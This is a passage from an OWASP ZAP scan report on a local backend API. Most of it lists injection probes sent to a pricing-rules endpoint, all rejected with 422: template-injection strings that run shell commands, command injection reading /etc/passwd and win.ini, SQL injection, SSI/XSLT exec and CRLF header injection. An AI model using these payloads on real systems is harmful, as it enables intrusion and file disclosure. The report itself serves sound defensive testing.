  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()(";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<!--")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<!--#EXEC cmd=\"dir \\\"-->")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<!--#EXEC cmd=\"ls /\"-->")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"sleep 15\") }")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<%=%x(sleep 15)%>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<xsl:value-of select=\"document('http://backend:22')\"/>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<xsl:value-of select=\"php:function('exec','erroneous_command 2>&amp;1')\"/>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<xsl:value-of select=\"system-property('xsl:vendor')\"/>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<xsl:value-of select=\"system-property('xsl:vendor')\"/><!--")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<xsl:variable name=\"rtobject\" select=\"runtime:getRuntime()\"/>\n<xsl:variable name=\"process\" select=\"runtime:exec($rtobject,'erroneous_command')\"/>\n<xsl:variable name=\"waiting\" select=\"process:waitFor($process)\"/>\n<xsl:value-of select=\"$process\"/>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe AND 1=1 -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe AND 1=2 -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe OR 1=1 -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe UNION ALL select NULL -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe&cat /etc/passwd&")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe&type %SYSTEMROOT%\\win.ini")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe' AND '1'='1' -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe' AND '1'='2' -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe' OR '1'='1' -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe' UNION ALL select NULL -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe'&cat /etc/passwd&'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe'&type %SYSTEMROOT%\\win.ini&'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe'(")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe') UNION ALL select NULL -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe';cat /etc/passwd;'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe';get-help")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe'|type %SYSTEMROOT%\\win.ini")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe) UNION ALL select NULL -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe;")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe;cat /etc/passwd;")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe;get-help #")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe;get-help")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe\" UNION ALL select NULL -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe\"")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe\"&cat /etc/passwd&\"")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe\"&type %SYSTEMROOT%\\win.ini&\"")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe\";cat /etc/passwd;\"")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe\";get-help")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe\"|type %SYSTEMROOT%\\win.ini")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe|type %SYSTEMROOT%\\win.ini")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("Set-cookie: Tamper=12a3b7fc-ac09-42dc-8ed8-9c6ae70ea62d")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("URL='http://6292097205271444573.owasp.org'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("ZAP %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n\n")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("ZAP")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("ZAP%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s\n")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("\"")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("\"'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("\"+response.write(913,548*680,333)+\"")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("\"/><xsl:value-of select=\"system-property('xsl:vendor')\"/><!--")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var=\"")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("\"><!--#EXEC cmd=\"dir \\\"--><")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("\"><!--#EXEC cmd=\"ls /\"--><")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("]]>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("any?\nSet-cookie: Tamper=12a3b7fc-ac09-42dc-8ed8-9c6ae70ea62d")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("any?\r\nSet-cookie: Tamper=12a3b7fc-ac09-42dc-8ed8-9c6ae70ea62d")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("any?\r\nSet-cookie: Tamper=12a3b7fc-ac09-42dc-8ed8-9c6ae70ea62d\r\n")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("any\nSet-cookie: Tamper=12a3b7fc-ac09-42dc-8ed8-9c6ae70ea62d")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("any\r\nSet-cookie: Tamper=12a3b7fc-ac09-42dc-8ed8-9c6ae70ea62d")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("any\r\nSet-cookie: Tamper=12a3b7fc-ac09-42dc-8ed8-9c6ae70ea62d\r\n")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("cat /etc/passwd")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("get-help")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("http://\\6292097205271444573.owasp.org")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("http://www.google.com")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("http://www.google.com/")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("http://www.google.com/search?q=ZAP")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("http://www.google.com:80/")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("http://www.google.com:80/search?q=ZAP")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("https://6292097205271444573%2eowasp%2eorg")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("https://6292097205271444573.owasp.org")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("https://6292097205271444573.owasp.org/?John Doe")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("https://\\6292097205271444573.owasp.org")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("mubBBVviMtsnvtiYeHKiPyPpIdtUxQeTEkScwcgnEwYMLqjSDruVPLbDSERGHNHgDPATfvNZTdKnswaeQEbIvjHSOVoUqcvHrDirpFyLMYimetTRnIMmIKntavIhZZMtVeFLIQZUkefoImayaVVMOvkmoOUMWuHVdfoYdGubPBSYaplRsCFwHsqUvGADvIZlsbZybRqxLGfQqCNuCxmKfTfrgjirgfrwitXPEIolcmXUhRgmSmokbUkSKxUQicvIYijIMnTRtsaLuKBOcJEFinShlrbRaYUocNTQaysNfBXsufiEXILXUtFZVMZFappGLYQMxRrYZmJwHQDEEbOkZnFiqfOJaJFdNLPKdwSVGffySTYVMQZHKbWeyNcSoEwjkEiQepjjWaHDoMWnmZULoowTQcoZUrDIKRdmoaNsVtJXTeJKCvsGMkcWZtNxrlKSJmqnHjxUgJJLQuGIJavQGXjQSqfHAQZhnZcAKwxlpFCwQsSwMiLMwOtSHmwthfW)`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("response.write(913,548*680,333)")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("system-property('xsl:vendor')/>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("type %SYSTEMROOT%\\win.ini")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("www.google.com")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("www.google.com/")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("www.google.com/search?q=ZAP")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("www.google.com:80/")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("www.google.com:80/search?q=ZAP")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj 6498*1220 zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj#set($x=3075*2002)${x}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj#{8849*8287}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj${1893*6627}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj<%=6109*3567%>zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj<p th:text=\"${3996*7579}\"></p>zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{#6155*1950}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{8544*2301}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{@3295*5202}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{@math key=\"1824\" method=\"multiply\" operand=\"7321\"/}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{{73950|add:33090}}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{{9832*4511}}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{{=3886*4883}}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("zj{{print \"8579\" \"5627\"}}zj")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("{system(\"sleep 15\")}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("{{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(\"sleep 15\")}}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("{{__import__(\"subprocess\").check_output(\"sleep 15\", shell=True)}}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\\\")\")()}}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules/
  * Node Name: `http://backend:8000/pricing/rules/ ()("John Doe")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``


Instances: 401

### Solution



### Reference



#### CWE Id: [ 388 ](https://cwe.mitre.org/data/definitions/388.html)


#### WASC Id: 20

#### Source ID: 4

### [ Authentication Request Identified ](https://www.zaproxy.org/docs/alerts/10111/)



##### Informational (High)

### Description

The given request has been identified as an authentication request. The 'Other Info' field contains a set of key=value lines which identify any relevant fields. If the request is in a context which has an Authentication Method set to "Auto-Detect" then this rule will change the authentication to match the request identified.

* URL: http://backend:8000/auth/login
  * Node Name: `http://backend:8000/auth/login ()(client_id,client_secret,grant_type,password,scope,username)`
  * Method: `POST`
  * Parameter: `username`
  * Attack: ``
  * Evidence: `password`
  * Other Info: `userParam=username
userValue=username
passwordParam=password`


Instances: 1

### Solution

This is an informational alert rather than a vulnerability and so there is nothing to fix.

### Reference


* [ https://www.zaproxy.org/docs/desktop/addons/authentication-helper/auth-req-id/ ](https://www.zaproxy.org/docs/desktop/addons/authentication-helper/auth-req-id/)



#### Source ID: 3

### [ Non-Storable Content ](https://www.zaproxy.org/docs/alerts/10049/)



##### Informational (Medium)

### Description

The response contents are not storable by caching components such as proxy servers. If the response does not contain sensitive, personal or user-specific information, it may benefit from being stored and cached, to improve performance.

* URL: http://backend:8000/leads/10
  * Node Name: `http://backend:8000/leads/10`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `DELETE `
  * Other Info: ``
* URL: http://backend:8000/health
  * Node Name: `http://backend:8000/health`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `authorization:`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fstatus=
  * Node Name: `http://backend:8000/leads/ (status)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `authorization:`
  * Other Info: ``
* URL: http://backend:8000/leads/10
  * Node Name: `http://backend:8000/leads/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `authorization:`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `authorization:`
  * Other Info: ``

Instances: Systemic


### Solution

The content may be marked as storable by ensuring that the following conditions are satisfied:
The request method must be understood by the cache and defined as being cacheable ("GET", "HEAD", and "POST" are currently defined as cacheable)
The response status code must be understood by the cache (one of the 1XX, 2XX, 3XX, 4XX, or 5XX response classes are generally understood)
The "no-store" cache directive must not appear in the request or response header fields
For caching by "shared" caches such as "proxy" caches, the "private" response directive must not appear in the response
For caching by "shared" caches such as "proxy" caches, the "Authorization" header field must not appear in the request, unless the response explicitly allows it (using one of the "must-revalidate", "public", or "s-maxage" Cache-Control response directives)
In addition to the conditions above, at least one of the following conditions must also be satisfied by the response:
It must contain an "Expires" header field
It must contain a "max-age" response directive
For "shared" caches such as "proxy" caches, it must contain a "s-maxage" response directive
It must contain a "Cache Control Extension" that allows it to be cached
It must have a status code that is defined as cacheable by default (200, 203, 204, 206, 300, 301, 404, 405, 410, 414, 501).

### Reference


* [ https://datatracker.ietf.org/doc/html/rfc7234 ](https://datatracker.ietf.org/doc/html/rfc7234)
* [ https://datatracker.ietf.org/doc/html/rfc7231 ](https://datatracker.ietf.org/doc/html/rfc7231)
* [ https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html ](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html)


#### CWE Id: [ 524 ](https://cwe.mitre.org/data/definitions/524.html)


